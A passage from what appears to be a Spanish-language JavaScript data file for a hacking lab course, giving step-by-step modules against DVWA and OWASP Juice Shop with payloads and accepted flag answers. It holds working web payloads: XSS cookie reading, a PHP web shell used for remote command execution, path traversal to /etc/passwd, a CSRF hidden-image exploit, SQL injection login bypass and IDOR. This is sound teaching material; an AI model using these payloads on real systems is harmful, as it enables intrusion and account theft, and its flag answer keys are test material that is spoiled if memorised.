            flagsAceptadas: ["5f4dcc3b5aa765d61d8327deb882cf99", "FLAG{5f4dcc3b5aa765d61d8327deb882cf99}", "FLAG{sqli-md5-hashes-dumped}"],
            objetivoFlag: 'Ingresa la flag cuando veas los hashes MD5 de las contrasenas en la pagina, por ejemplo el hash "5f4dcc3b5aa765d61d8327deb882cf99" junto al usuario admin.'
          }
        ]
      },
      {
        id: 'dvwa-xss-reflected',
        numero: 4,
        titulo: 'Cross-Site Scripting Reflejado',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Identificar punto de reflexion de datos',
            como: `Donde se hace: En Firefox, en la sección "XSS (Reflected)" de DVWA.

Objetivo: Comprobar si el texto que ingresas en el formulario es devuelto e impreso tal cual por el servidor en la página web.

Paso a paso:
1. En el menú de DVWA, entra a "XSS (Reflected)".
2. En la casilla que dice "What's your name?", escribe: PruebaLab
3. Haz clic en el botón "Submit".
4. Verás que la página responde con un saludo que dice: Hello PruebaLab.

¿Por qué es un riesgo?: Si el servidor imprime lo que tú le mandas sin "desinfectarlo" (sanitizar caracteres especiales como < o >), un atacante puede inyectar código de programación en vez de un simple nombre.`,
            payload: 'PruebaLab',
            flag: 'FLAG{xss-reflected-hello-pruebalab}',
            dondeEncontrarla: 'En el saludo de respuesta que aparece en la página tras pulsar Submit.',
            quePoner: 'Escribe la frase completa de saludo reflejada en pantalla: Hello PruebaLab',
            flagsAceptadas: ["Hello PruebaLab", "hello pruebalab", "PruebaLab", "FLAG{xss-reflected-hello-pruebalab}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre exactamente "Hello PruebaLab" como respuesta, confirmando que el servidor refleja tu entrada sin sanitizacion.'
          },
          {
            numero: 2,
            titulo: 'Inyectar codigo JavaScript ejecutable',
            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).

Objetivo: Hacer que el navegador ejecute una ventana emergente de alerta utilizando una etiqueta <script> de JavaScript.

Paso a paso:
1. En la casilla "What's your name?", escribe exactamente:
   <script>alert('XSS')</script>
2. Haz clic en el botón "Submit".
3. En la parte superior de tu navegador saltará una ventana emergente (pop-up) con el texto "XSS".

¿Qué acaba de pasar?: El navegador web no diferenció entre el contenido normal de la página y tu código inyectado; creyó que era una instrucción legítima de los creadores de la web y ejecutó la función alert('XSS').`,
            payload: "<script>alert('XSS')</script>",
            flag: 'FLAG{xss-alert-executed-success}',
            dondeEncontrarla: 'En el cuadro emergente de alerta que salta en la parte superior del navegador.',
            quePoner: 'Escribe el texto que aparece dentro de la alerta emergente: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{xss-alert-executed-success}"],
            objetivoFlag: 'Ingresa la flag cuando veas el cuadro de alerta emergente con el texto "XSS" en tu navegador al hacer Submit del payload.'
          },
          {
            numero: 3,
            titulo: 'Demostrar robo de cookie de sesion',
            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).

Objetivo: Demostrar cómo un atacante puede usar XSS para leer las cookies secretas que mantienen iniciada tu sesión en la web.

Paso a paso:
1. En la casilla "What's your name?", escribe:
   <script>alert(document.cookie)</script>
2. Haz clic en "Submit".
3. En la ventana emergente verás tu identificador de sesión: security=low; PHPSESSID=...

¿Cuál es el peligro real de esto?: Si un atacante convence a una víctima de hacer clic en un enlace con este código, el script puede enviar en secreto esa cookie a su propio servidor y entrar a la cuenta de la víctima sin saber su contraseña.`,
            payload: '<script>alert(document.cookie)</script>',
            flag: 'FLAG{xss-cookie-phpsessid-leaked}',
            dondeEncontrarla: 'En la ventana emergente generada al ejecutar document.cookie.',
            quePoner: 'Escribe el nombre de la cookie de sesión de PHP: PHPSESSID',
            flagsAceptadas: ["PHPSESSID", "phpsessid", "FLAG{xss-cookie-phpsessid-leaked}"],
            objetivoFlag: 'Ingresa la flag cuando el alert emergente muestre tu valor de PHPSESSID (por ejemplo: "security=low; PHPSESSID=abc123..."), confirmando el robo de sesion.'
          }
        ]
      },
      {
        id: 'dvwa-xss-stored',
        numero: 5,
        titulo: 'Cross-Site Scripting Almacenado',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Modificar limite de caracteres en el navegador',
            como: `Donde se hace: En Firefox, en la sección "XSS (Stored)" de DVWA.

Objetivo: Usar las herramientas de desarrollo del navegador (F12) para quitar una restricción visual que limita a 10 letras lo que podemos escribir.

Paso a paso:
1. En el menú de DVWA, haz clic en "XSS (Stored)".
2. Verás un libro de visitas con los campos "Name" (Nombre) y "Message" (Mensaje). Si intentas escribir en "Name", verás que se detiene al llegar a 10 caracteres.
3. Haz clic derecho sobre la casilla "Name" y selecciona "Inspeccionar" (o presiona F12).
4. En el código HTML que se abre abajo, verás la etiqueta: <input name="txtName" ... maxlength="10">.
5. Haz doble clic sobre el número 10 y cámbialo por 200. Presiona Enter.
6. Ahora podrás escribir textos mucho más largos en el campo "Name".

Lección de seguridad para principiantes: Las protecciones puestas solo en el HTML del navegador (del lado del cliente) nunca son seguras, porque cualquier persona las puede modificar con las herramientas de desarrollador.`,
            payload: 'maxlength="200"',
            flag: 'FLAG{xss-stored-maxlength-bypassed}',
            dondeEncontrarla: 'En las herramientas de desarrollo (F12 -> Inspector) sobre la etiqueta input del campo Name.',
            quePoner: 'Escribe el nombre del atributo HTML que limitaba los caracteres: maxlength',
            flagsAceptadas: ["maxlength", "max-length", "MAXLENGTH", "FLAG{xss-stored-maxlength-bypassed}"],
            objetivoFlag: 'Ingresa la flag cuando hayas modificado el atributo maxlength a 200 en DevTools y el campo "Name" acepte mas de 10 caracteres sin restriccion.'
          },
          {
            numero: 2,
            titulo: 'Guardar el payload en la base de datos',
            como: `Donde se hace: En el formulario de "Guestbook" de XSS (Stored) en DVWA.

Objetivo: Guardar de forma permanente un código JavaScript en la base de datos MySQL del servidor de la Raspberry Pi.

Paso a paso:
1. En la casilla "Name", escribe exactamente:
   <script>alert('Stored')</script>
2. En la casilla "Message", escribe cualquier mensaje como: Hola mundo
3. Haz clic en el botón "Sign Guestbook".
4. Al instante saltará una ventana emergente que dice "Stored".

¿Por qué es "Almacenado"?: A diferencia del XSS Reflejado (que desaparece en un segundo), el servidor guardó este comentario en su base de datos. Cada vez que alguien visite esta página, su navegador cargará el comentario y ejecutará el script.`,
            payload: "Name: <script>alert('Stored')</script>\nMessage: Hola",
            flag: 'FLAG{xss-stored-payload-saved-db}',
            dondeEncontrarla: 'En la ventana de alerta que salta al hacer clic en Sign Guestbook.',
            quePoner: 'Escribe la palabra configurada dentro de la alerta: Stored',
            flagsAceptadas: ["Stored", "stored", "STORED", "FLAG{xss-stored-payload-saved-db}"],
            objetivoFlag: 'Ingresa la flag cuando al hacer "Sign Guestbook" el alert emergente con "Stored" se dispare automaticamente, confirmando que el script fue guardado en la BD.'
          },
          {
            numero: 3,
            titulo: 'Verificar persistencia del ataque',
            como: `Donde se hace: En el navegador Firefox.

Objetivo: Comprobar que el ataque quedó guardado permanentemente y se ejecuta de manera automática cada vez que se carga la página.

Paso a paso:
1. Presiona la tecla F5 para recargar la página (o abre una ventana de incógnito y entra a la misma sección).
2. Observa cómo la ventana emergente con "Stored" se dispara automáticamente sin que tengas que volver a escribir nada.

Impacto de esta vulnerabilidad: En una red social o foro real, cualquier persona que entre a leer los comentarios resultaría atacada automáticamente, sin necesidad de hacer ningún clic sospechoso.`,
            payload: 'F5 / Recargar pagina',
            flag: 'FLAG{xss-stored-persists-on-reload}',
            dondeEncontrarla: 'Al recargar la página con F5 o abrirla en una ventana privada.',
            quePoner: 'Escribe el texto de la alerta que se vuelve a disparar al recargar: Stored',
            flagsAceptadas: ["Stored", "stored", "FLAG{xss-stored-persists-on-reload}"],
            objetivoFlag: 'Ingresa la flag cuando al recargar la pagina XSS Stored (o abrirla en ventana privada) el alert "Stored" se ejecute automaticamente sin intervenir.'
          }
        ]
      },
      {
        id: 'dvwa-upload',
        numero: 6,
        titulo: 'Subida de Archivos y Web Shell',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Crear archivo Web Shell en PHP',
            como: `Donde se hace: En tu máquina Kali Linux (en una terminal).

Objetivo: Crear un archivo de una sola línea en lenguaje PHP que nos permita enviarle órdenes a la Raspberry Pi a través de la web.

Paso a paso:
1. En Kali Linux, abre una terminal.
2. Crea el archivo ejecutando este comando:
   echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
3. Comprueba que el archivo se haya creado correctamente viendo su contenido:
   cat shell.php

¿Qué es una Web Shell?: Es un pequeño script que le dice al servidor: "Si alguien visita esta página y añade en la URL el parámetro ?cmd=un_comando, pásalo a la función system() de Linux para que lo ejecute".`,
            payload: '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
            flag: 'FLAG{webshell-php-file-created}',
            dondeEncontrarla: 'En tu terminal de Kali Linux al verificar el contenido con cat shell.php.',
            quePoner: 'Escribe el nombre de la función de PHP usada para ejecutar órdenes: system',
            flagsAceptadas: ["system", "system()", "FLAG{webshell-php-file-created}"],
            objetivoFlag: 'Ingresa la flag cuando hayas creado el archivo shell.php en tu Kali Linux y puedas verificar su contenido con "cat shell.php" en la terminal.'
          },
          {
            numero: 2,
            titulo: 'Subir el archivo al servidor',
            como: `Donde se hace: En Firefox, en la sección "File Upload" de DVWA.

Objetivo: Subir nuestro archivo shell.php al servidor web aprovechando que el formulario no valida si es una imagen real.

Paso a paso:
1. En el menú de DVWA, haz clic en "File Upload".
2. Haz clic en el botón "Examinar..." o "Seleccionar archivo" y busca tu archivo shell.php.
3. Haz clic en el botón "Upload".
4. Aparecerá un mensaje azul o verde confirmando que el archivo fue subido con éxito:
   ../../hackable/uploads/shell.php succesfully uploaded!

¿Por qué es un fallo grave?: Un formulario de fotos de perfil jamás debería permitir subir archivos con extensión .php. Al no comprobar el tipo de archivo, el servidor lo guarda listo para ser ejecutado.`,
            payload: 'Archivo: shell.php',
            flag: 'FLAG{webshell-uploaded-to-server}',
            dondeEncontrarla: 'En el mensaje verde de éxito que muestra DVWA tras hacer clic en Upload.',
            quePoner: 'Escribe la ruta donde se guardó el archivo: ../../hackable/uploads/shell.php (o simplemente hackable/uploads/shell.php)',
            flagsAceptadas: ["../../hackable/uploads/shell.php", "hackable/uploads/shell.php", "FLAG{webshell-uploaded-to-server}"],
            objetivoFlag: 'Ingresa la flag cuando DVWA muestre el mensaje de exito indicando que el archivo fue subido a "../../hackable/uploads/shell.php".'
          },
          {
            numero: 3,
            titulo: 'Ejecutar comandos en la Raspberry Pi',
            como: `Donde se hace: En la barra de direcciones de tu navegador Firefox.

Objetivo: Usar nuestra Web Shell para ejecutar comandos en el sistema operativo del servidor directamente desde la URL.

Paso a paso:
1. En la barra de direcciones de tu navegador, ve a la ruta donde se guardó el archivo y añade el comando ?cmd=id al final:
   http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id
2. Presiona Enter.
3. Verás en pantalla la respuesta devuelta por Linux en la Raspberry Pi:
   uid=33(www-data) gid=33(www-data) groups=33(www-data)

¿Qué significa esto?: Has conseguido lo que en ciberseguridad se conoce como RCE (Remote Code Execution o Ejecución Remota de Código): control total para mandar órdenes al servidor desde cualquier parte de la red.`,
            payload: 'http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id',
            flag: 'FLAG{webshell-rce-uid-www-data}',
            dondeEncontrarla: 'En el navegador, al visitar la URL con ?cmd=id y ver la respuesta de uid.',
            quePoner: 'Escribe el número de usuario (uid) de www-data que viste: 33',
            flagsAceptadas: ["33", "uid=33", "uid=33(www-data)", "FLAG{webshell-rce-uid-www-data}"],
            objetivoFlag: 'Ingresa la flag cuando tu web shell devuelva en el navegador la linea "uid=33(www-data) gid=33(www-data)" como resultado del comando id.'
          }
        ]
      },
      {
        id: 'dvwa-fi',
        numero: 7,
        titulo: 'Inclusion Local de Archivos (LFI)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar el parametro de inclusion',
            como: `Donde se hace: En Firefox, en la sección "File Inclusion" de DVWA.

Objetivo: Descubrir cómo decide la aplicación web qué archivo debe cargar y mostrar en la pantalla.

Paso a paso:
1. En el menú de DVWA, entra a "File Inclusion".
2. Verás tres enlaces de ejemplo: "file1.php", "file2.php", "file3.php". Haz clic en cualquiera de ellos.
3. Observa atentamente la barra de direcciones de tu navegador:
   http://<IP_LAB>/dvwa/vulnerabilities/fi/?page=file1.php

¿Qué significa esto?: La aplicación utiliza un parámetro llamado ?page= para pedirle al servidor qué archivo debe leer y mostrar.`,
            payload: '?page=include.php',
            flag: 'FLAG{lfi-page-param-identified}',
            dondeEncontrarla: 'En la barra de direcciones de tu navegador al hacer clic en los enlaces de File Inclusion.',
            quePoner: 'Escribe el nombre del parámetro en la URL: page',
            flagsAceptadas: ["page", "page=", "?page", "FLAG{lfi-page-param-identified}"],
            objetivoFlag: 'Ingresa la flag cuando confirmes en la URL del navegador que la pagina usa el parametro ?page= para cargar archivos (ej: .../file_inclusion/?page=file1.php).'
          },
          {
            numero: 2,
            titulo: 'Escapar del directorio raiz (Path Traversal)',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Usar la técnica de los dos puntos y barra (../) para salir de la carpeta web y leer un archivo confidencial del sistema operativo.

Paso a paso:
1. En la barra de direcciones, cambia file1.php por una serie de saltos hacia atrás seguidos de /etc/passwd:
   ../../../../../../../../etc/passwd
2. Presiona Enter.
3. Verás impreso en pantalla el listado de usuarios del sistema Linux (root:x:0:0:root:... y su terminal /bin/bash).

¿Por qué funciona?: Cada ../ significa "sube un nivel de carpeta hacia atrás". Poniendo varios seguidos, llegamos a la raíz del disco duro (/) y desde ahí abrimos el archivo /etc/passwd. Esto se conoce como Directory Traversal.`,
            payload: '?page=../../../../../../../../etc/passwd',
            flag: 'FLAG{lfi-etcpasswd-file-read}',
            dondeEncontrarla: 'En la página de DVWA tras incluir /etc/passwd, en la línea de root.',
            quePoner: 'Escribe la terminal o intérprete asignado a root: /bin/bash (o bin/bash)',
            flagsAceptadas: ["/bin/bash", "bin/bash", "bash", "FLAG{lfi-etcpasswd-file-read}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre el contenido de /etc/passwd del servidor, con lineas como "root:x:0:0:root:/root:/bin/bash".'
          },
          {
            numero: 3,
            titulo: 'Extraer codigo fuente con Wrapper Base64',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Descargar el código fuente en PHP de un archivo sin que el servidor lo ejecute, convirtiéndolo a texto Base64.

Paso a paso:
1. En la barra de direcciones, cambia el valor de ?page= por este filtro especial de PHP:
   ?page=php://filter/convert.base64-encode/resource=index.php
2. Presiona Enter.
3. La pantalla se llenará con una cadena larga de texto codificada en Base64 que comienza por PD9waHA...
4. Al decodificar esa cadena (por ejemplo en la herramienta CyberChef o con el comando base64 -d), obtendrás el código fuente original del archivo index.php (con <?php).

¿Para qué sirve esto a un auditor?: Normalmente si intentas abrir un archivo .php con LFI, el servidor lo ejecuta y no te muestra su código. Con este filtro, el servidor lo convierte a texto plano Base64 antes de procesarlo, permitiéndote auditar el código fuente.`,
            payload: '?page=php://filter/convert.base64-encode/resource=index.php',
            flag: 'FLAG{lfi-base64-source-code-exposed}',
            dondeEncontrarla: 'En la respuesta de la página donde aparece la cadena en Base64.',
            quePoner: 'Escribe los primeros 7 caracteres de la cadena Base64 que viste: PD9waHA',
            flagsAceptadas: ["PD9waHA", "pd9wah", "FLAG{lfi-base64-source-code-exposed}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina devuelva una larga cadena en Base64 comenzando con "PD9waHA" (<?php en base64), que es el codigo fuente de index.php.'
          }
        ]
      },
      {
        id: 'dvwa-csrf',
        numero: 8,
        titulo: 'Falsificacion de Peticiones (CSRF)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar peticion de cambio de contrasena',
            como: `Donde se hace: En Firefox, en la sección "CSRF" de DVWA.

Objetivo: Comprender cómo cambia la contraseña DVWA y comprobar que carece de protección anti-CSRF.

Paso a paso:
1. En el menú de DVWA, entra a "CSRF".
2. Escribe una nueva contraseña en ambos campos (por ejemplo: 123) y haz clic en "Change".
3. Revisa la barra de direcciones del navegador:
   .../csrf/?password_new=123&password_conf=123&Change=Change

¿Dónde está el fallo?: La solicitud se envía por método GET y no incluye ningún token temporal secreto (código anti-CSRF). Cualquier sitio web externo puede recrear este enlace exacto.`,
            payload: 'GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change',
            flag: 'FLAG{csrf-get-no-token-confirmed}',
            dondeEncontrarla: 'En la barra de direcciones de tu navegador tras presionar Change.',
            quePoner: 'Escribe el nombre del parámetro que envía la nueva contraseña: password_new',
            flagsAceptadas: ["password_new", "password_conf", "FLAG{csrf-get-no-token-confirmed}"],
            objetivoFlag: 'Ingresa la flag cuando veas en la barra de direcciones la peticion GET con los parametros password_new y password_conf expuestos en la URL tras hacer "Change".'
          },
          {
            numero: 2,
            titulo: 'Construir vector de ataque HTML',
            como: `Donde se hace: En tu editor de texto o en el navegador.

Objetivo: Entender cómo una página web trampa puede obligar al navegador de una víctima a cambiar su contraseña sin su consentimiento.

Paso a paso:
1. Un atacante puede crear un archivo HTML sencillo con una etiqueta de imagen invisible:
   <img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
2. Si un usuario con sesión abierta en DVWA visita esa página trampa, su navegador intentará "cargar la imagen", ejecutando en realidad la orden de cambio de contraseña a "hacked".
3. Al visitar esa URL directamente en el navegador, verás el mensaje verde de confirmación:
   Password Changed.

¿Por qué se llama CSRF?: Significa Cross-Site Request Forgery (Falsificación de Peticiones en Sitios Cruzados). El usuario nunca quiso cambiar su contraseña, pero el sitio malicioso falsificó la petición en su nombre aprovechando su sesión abierta.`,
            payload: '<img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">',
            flag: 'FLAG{csrf-exploit-html-password-changed}',
            dondeEncontrarla: 'En el mensaje de confirmación que muestra DVWA tras cambiar la contraseña.',
            quePoner: 'Escribe el mensaje de éxito que muestra DVWA: Password Changed.',
            flagsAceptadas: ["Password Changed.", "Password Changed", "password changed.", "FLAG{csrf-exploit-html-password-changed}"],
            objetivoFlag: 'Ingresa la flag cuando al abrir tu exploit.html en el navegador, DVWA muestre el mensaje "Password Changed." confirmando que el ataque CSRF funciono.'
          }
        ]
      }
    ]
  },
  'OWASP Juice Shop': {
    nombre: 'OWASP Juice Shop',
    categoria: 'SPA Moderna & API REST',
    modulos: [
      {
        id: 'juice-recon',
        numero: 1,
        titulo: 'Reconocimiento y Score Board',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Configurar filtro de trafico JSON en Burp y acceder a Juice Shop',
            como: `Donde se hace: En Burp Suite y Firefox.

Objetivo: Conectarse a la tienda moderna OWASP Juice Shop y filtrar las peticiones para enfocarnos únicamente en su API REST (datos JSON), ocultando imágenes y estilos.

Paso a paso:
1. Abre Firefox con FoxyProxy en modo "Burp".
2. Entra a Juice Shop en tu Raspberry Pi: http://<IP_PI>:3000
3. En Burp Suite, ve a "Proxy" -> "HTTP history".
4. Haz clic en la barra gris superior que dice "Filter: ...".
5. En la ventana de filtros, asegúrate de marcar "JSON" y "Fetch/XHR" para ocultar imágenes y archivos estáticos. Haz clic en "Apply".

¿Por qué hacemos esto?: Juice Shop es una aplicación moderna (Single Page Application). La interfaz en Angular habla con el servidor mediante peticiones en formato JSON.`,
            payload: 'http://<IP_PI>:3000\nFiltro Burp: JSON / Fetch / XHR',
            flag: 'FLAG{juice-burp-json-filter-active}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> HTTP history tras activar el filtro JSON / Fetch / XHR.',
            quePoner: 'Escribe el formato de datos de la API que filtramos: JSON',
            flagsAceptadas: ["JSON", "json", "FLAG{juice-burp-json-filter-active}"],
            objetivoFlag: 'Ingresa la flag cuando Juice Shop cargue en el navegador y en Burp HTTP history solo veas peticiones de tipo JSON/XHR (sin CSS, JS ni imagenes).'
          },
          {
            numero: 2,
            titulo: 'Buscar ruta oculta del Score Board',
            como: `Donde se hace: En el navegador Firefox usando las herramientas de desarrollador (F12).

Objetivo: Inspeccionar el código JavaScript de la aplicación para encontrar la ruta secreta que lleva al panel de retos oficial.

Paso a paso:
1. En la pestaña de Juice Shop en Firefox, presiona F12 para abrir las herramientas de desarrollador.
2. Presiona las teclas Ctrl + Shift + F (o Cmd + Option + F en Mac) para abrir la búsqueda global en todos los archivos.
3. En la barra de búsqueda escribe: score-board y presiona Enter.
4. Verás resultados dentro de un archivo JavaScript (como main.js), donde el enrutador de Angular define la ruta: path: 'score-board'.`,
            payload: 'Buscar: score-board\nAtajo DevTools: Ctrl + Shift + F',
            flag: 'FLAG{juice-scoreboard-route-found}',
            dondeEncontrarla: 'En DevTools (F12 -> búsqueda con Ctrl+Shift+F), localizando la ruta en el código de Angular.',
            quePoner: 'Escribe el nombre de la ruta que encontraste: score-board',
            flagsAceptadas: ["score-board", "score board", "#/score-board", "FLAG{juice-scoreboard-route-found}"],
            objetivoFlag: 'Ingresa la flag cuando localices en DevTools la definicion de la ruta "score-board" dentro del archivo de JavaScript del bundle de Angular (main.js).'
          },
          {
            numero: 3,
            titulo: 'Desbloquear panel de retos',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Visitar la ruta oculta y desbloquear el Score Board con la primera insignia de reto completado.

Paso a paso:
1. En la barra de direcciones de Juice Shop, añade /#/score-board al final:
   http://<IP_PI>:3000/#/score-board
2. Presiona Enter.
3. Verás una notificación emergente con confeti felicitándote por resolver el primer reto: "Find the carefully hidden 'Score Board' page".
4. En el panel aparecerá la tarjeta marcada con una insignia verde de "Solved" (Resuelto).`,
            payload: 'http://<IP_LAB>/#/score-board',
            flag: 'FLAG{juice-scoreboard-challenge-1-solved}',
            dondeEncontrarla: 'En el Score Board de Juice Shop tras acceder a /#/score-board.',
            quePoner: 'Escribe la palabra que indica que el reto está resuelto: Solved (o Score Board)',
            flagsAceptadas: ["Score Board", "Solved", "solved", "score-board", "FLAG{juice-scoreboard-challenge-1-solved}"],
            objetivoFlag: 'Ingresa la flag cuando accedas al Score Board y veas la primera tarjeta de reto marcada como resuelta (estrella verde o texto "Solved") en el panel.'
          }
        ]
      },
      {
        id: 'juice-sqli',
        numero: 2,
        titulo: 'Inyeccion SQL en API JSON',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Interceptar peticion de login en Burp Suite',
            como: `Donde se hace: En Firefox y Burp Suite.

Objetivo: Observar cómo viajan las credenciales hacia una API REST moderna en formato JSON cuando intentas iniciar sesión.

Paso a paso:
1. En Juice Shop, haz clic en "Account" (arriba a la derecha) y luego en "Login".
2. En Burp Suite, ve a "Proxy" -> "Intercept" y activa "Intercept is on".
3. En el formulario de login de Juice Shop escribe un email cualquiera (test@test.com) y una contraseña cualquiera (123), y haz clic en "Log in".
4. Cambia a Burp Suite: verás la petición POST /rest/user/login con un cuerpo JSON conteniendo {"email":"test@test.com","password":"123"}.`,
            payload: 'POST /rest/user/login\n{"email":"test@test.com","password":"123"}',
            flag: 'FLAG{juice-sqli-post-intercepted}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept, observando la primera línea de la petición POST.',
            quePoner: 'Escribe la ruta del endpoint de login: /rest/user/login',
            flagsAceptadas: ["/rest/user/login", "rest/user/login", "user/login", "FLAG{juice-sqli-post-intercepted}"],
            objetivoFlag: 'Ingresa la flag cuando veas en Burp la peticion POST a /rest/user/login con el body JSON conteniendo los campos email y password que enviaste.'
          },
          {
            numero: 2,
            titulo: 'Bypass de autenticacion de Administrador',
            como: `Donde se hace: En el formulario de Login de Juice Shop (con "Intercept is off" en Burp Suite para navegar rápido).

Objetivo: Entrar a la cuenta del Administrador de la tienda sin saber su contraseña, utilizando una inyección SQL.

Paso a paso:
1. Asegúrate de que en Burp Suite esté en "Intercept is off" (o desactiva FoxyProxy temporalmente).
2. En el campo "Email" del formulario de login de Juice Shop, escribe exactamente:
   ' OR 1=1--
3. En el campo "Password", escribe cualquier texto inventado (por ejemplo: abc).
4. Haz clic en el botón "Log in".
5. ¡Listo! La tienda iniciará sesión inmediatamente. En la esquina superior derecha, haz clic en "Account" y verás que estás conectado como:
   admin@juice-sh.op

¿Por qué funciona?: Las dos rayas (--) en SQL representan un comentario, anulando por completo la verificación de contraseña. Y como 1=1 siempre es verdadero, la base de datos devuelve la primera cuenta registrada: el Administrador.`,
            payload: "' OR 1=1--",
            flag: 'FLAG{juice-sqli-admin-login-success}',
            dondeEncontrarla: 'En el menú superior de Juice Shop al hacer clic en Account tras iniciar sesión.',
            quePoner: 'Escribe el correo del administrador con el que iniciaste sesión: admin@juice-sh.op',
            flagsAceptadas: ["admin@juice-sh.op", "admin", "admin@juice-shop.op", "FLAG{juice-sqli-admin-login-success}"],
            objetivoFlag: 'Ingresa la flag cuando Juice Shop te redirija al inicio de sesion exitoso como admin@juice-sh.op, con el nombre "Admin" visible en el menu de usuario superior.'
          }
        ]
      },
      {
        id: 'juice-logic',
        numero: 3,
        titulo: 'Manipulacion de Logica de Negocio',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Capturar peticion de adicion al carrito',
            como: `Donde se hace: En Burp Suite y Firefox.

Objetivo: Capturar el momento en que agregas un producto a la cesta para observar el parámetro de cantidad en la petición JSON.

Paso a paso:
1. Inicia sesión en Juice Shop y ve al catálogo principal de productos.
2. En Burp Suite, activa "Intercept is on".
3. En Juice Shop, haz clic en el botón "Add to Basket" (Añadir a la cesta) de cualquier producto (por ejemplo, Apple Juice).
4. En Burp Suite verás detenida la petición POST /api/BasketItems/ con un cuerpo JSON como:
   {"ProductId":1,"BasketId":"...","quantity":1}`,
            payload: 'POST /api/BasketItems/\n{"ProductId":1,"BasketId":"1","quantity":1}',
            flag: 'FLAG{juice-logic-basket-post-captured}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept tras hacer clic en Add to Basket.',
            quePoner: 'Escribe el valor inicial del parámetro quantity: 1',
            flagsAceptadas: ["1", "quantity: 1", "FLAG{juice-logic-basket-post-captured}"],
            objetivoFlag: 'Ingresa la flag cuando veas en Burp Intercept la peticion POST a /api/BasketItems con el campo "quantity":1 en el body JSON capturado.'
          },
          {
            numero: 2,
            titulo: 'Alterar cantidad a valor negativo',
            como: `Donde se hace: En Burp Suite (en la ventana de Intercept).

Objetivo: Modificar la cantidad a un número negativo para reducir el precio total del carrito y obtener productos gratis.

Paso a paso:
1. Con la petición aún detenida en Burp Suite, cambia el número 1 del campo "quantity": 1 por un número negativo:
   {"ProductId":1,"BasketId":"...","quantity":-5}
2. Haz clic en el botón "Forward" en Burp Suite para enviar la petición modificada.
3. En Firefox, haz clic en el icono del carrito de compras arriba a la derecha.
4. Verás que el producto tiene una cantidad de -5 y el precio total de tu cesta se ha reducido o muestra un saldo a tu favor.

¿Por qué es un fallo de lógica de negocio?: Los desarrolladores validaron las cantidades en los botones de la pantalla, pero olvidaron verificar en el servidor que la cantidad recibida fuera siempre un número entero positivo mayor a cero.`,
            payload: '{"ProductId":1,"BasketId":"1","quantity":-5}',
            flag: 'FLAG{juice-logic-negative-total-achieved}',
            dondeEncontrarla: 'En la vista del carrito de compras de Juice Shop tras alterar quantity a -5.',
            quePoner: 'Escribe el valor negativo que inyectaste: -5',
            flagsAceptadas: ["-5", "$0.00", "0", "FLAG{juice-logic-negative-total-achieved}"],
            objetivoFlag: 'Ingresa la flag cuando el carrito de Juice Shop muestre un total negativo o en $0.00 gracias a la cantidad -5 que enviaste via Burp.'
          }
        ]
      },
      {
        id: 'juice-idor',
        numero: 4,
        titulo: 'Acceso No Autorizado e IDOR',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Localizar endpoint de la cesta',
            como: `Donde se hace: En Firefox y Burp Suite.

Objetivo: Identificar cómo sabe la tienda cuál es tu cesta de compras (observando el número identificador en la URL).

Paso a paso:
1. En Juice Shop, haz clic en el icono del carrito de compras.
2. En Burp Suite, ve a "Proxy" -> "HTTP history" y busca las últimas peticiones realizadas.
3. Localiza la petición GET hacia una ruta como /rest/basket/2 (donde el número final es tu ID de cesta personal).`,
            payload: 'GET /rest/basket/2',
            flag: 'FLAG{juice-idor-basket-endpoint-found}',
            dondeEncontrarla: 'En Burp HTTP history o DevTools Network al abrir la cesta, observando la ruta con ID numérico.',
            quePoner: 'Escribe el nombre del recurso de la API de la cesta: basket (o /rest/basket)',
            flagsAceptadas: ["basket", "/rest/basket", "FLAG{juice-idor-basket-endpoint-found}"],
            objetivoFlag: 'Ingresa la flag cuando identifiques en Burp HTTP history o DevTools Network la peticion GET a /rest/basket/{id} con tu ID de cesta visible en la URL.'
          },
          {
            numero: 2,
            titulo: 'Consultar cesta de otro usuario',
            como: `Donde se hace: En Burp Suite (utilizando la herramienta Repeater).

Objetivo: Cambiar el número de tu cesta por el número de la cesta de otro usuario para ver sus productos privados sin autorización.

Paso a paso:
1. En Burp Suite en "HTTP history", haz clic derecho sobre la petición GET /rest/basket/X y elige "Send to Repeater" (Enviar a Repeater).
2. Ve a la pestaña "Repeater" arriba.
3. En la primera línea, cambia el número de la cesta por el número 1:
   GET /rest/basket/1 HTTP/1.1
4. Haz clic en el botón naranja "Send" (Enviar).
5. En el panel de respuesta a la derecha, verás un JSON con los productos que pertenecen al carrito de otro usuario (la cesta número 1).

¿Qué significa IDOR?: Insecure Direct Object Reference (Referencia Directa Insegura a Objetos). Ocurre cuando una aplicación expone un identificador directo (como un número en la URL) sin verificar si quien lo solicita tiene permiso para verlo.`,
